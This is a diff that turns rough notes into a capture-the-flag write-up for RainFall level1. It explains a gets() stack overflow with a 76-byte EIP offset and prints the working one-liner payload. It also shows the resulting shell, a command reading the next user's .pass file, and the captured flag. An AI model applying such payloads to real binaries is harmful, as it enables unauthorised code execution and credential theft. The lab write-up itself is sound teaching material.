@@ -1,13 +1,23 @@
-https://www.youtube.com/watch?v=1S0aBV-Waeo
-https://www.youtube.com/watch?v=V9lMxx3iFWU
-https://stackoverflow.com/questions/16325486/using-buffer-overflow-to-execute-shell-code
+# What do we exploit?
 
-gdb level1
+Stack overflow in insecure `gets` function.
 
-https://www.geeksforgeeks.org/objdump-command-in-linux-with-examples/
-objdump --help
-file level1
-objdump -d -M i386 level1
+# How do we exploit it?
 
-https://unix.stackexchange.com/questions/297560/cat-into-stdin-then-pipe-into-program-keeps-forked-shell-open-why
-cat <(python -c "print 'A'*76 + '\x08\x04\x84\x44'[::-1]") - | ./level1
+Using [this](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator) utility we can compute the EIP offset. It's equal to 76, and, knowing that, we can exploit it sending 76 bytes of different trash to `stdin` of our binary, and then writing the address of the command we want to execute.
+
+To figure out, what we can execute, let's list all the functions in this binary using `gdb` `info functions` method. It lists function `run` among other functions. It doesn't look like system function, so let's figure out what that function is using `gdb` `disassemble run` method.
+
+    0x08048472 <+46>:	movl   $0x8048584,(%esp)
+    0x08048479 <+53>:	call   0x8048360 <system@plt>
+
+We are very lucky, it invokes `system@plt` function. So, let's invoke `run` function using `gets` vulnerability by performing stack overflow, invoking the `run` function instead of the `return` call.
+    
+    level1@RainFall:~$ cat <(python -c "print 'A'*76 + '\x08\x04\x84\x44'[::-1]") - | ./level1
+    Good... Wait what?
+    whoami
+    level2
+
+As you can see, it worked out perfectly well. Now we cat get the password to the next user by executing the `cat /home/user/level2/.pass`. The flag we've got: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
+
+
